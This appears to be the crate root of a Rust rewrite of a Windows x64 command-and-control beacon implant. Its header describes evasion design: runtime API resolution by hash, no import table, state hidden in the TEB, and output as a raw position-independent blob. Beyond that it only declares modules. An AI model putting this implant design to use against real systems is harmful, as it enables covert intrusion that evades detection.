//! Specter-rs beacon — position-independent Windows x64 implant.
//!
//! Rust rewrite of Specter (https://github.com/0xC9H/specter), beacon
//! (`src_beacon`).
//!
//! Philosophy preserved from the original (all non-negotiable, see
//! docs/ETUDE-DE-FAISABILITE.md):
//!
//! - no CRT, no import table: every API is resolved at runtime by FNV-64 hash
//! - no globals: the instance lives in `TEB->NtTib.ArbitraryUserPointer` and
//!   is passed explicitly; fully reentrant
//! - single `.text` section via the link pipeline; the artifact is a raw blob
//!   extracted from the linked image
//! - no formatting, no logging, no unwinding

#![no_std]
// Blob-code discipline (see specter-core for the rationale).
#![warn(clippy::unwrap_used, clippy::expect_used)]

pub mod coff;
pub mod entry;
pub mod net;
pub mod runtime;
pub mod tasks;
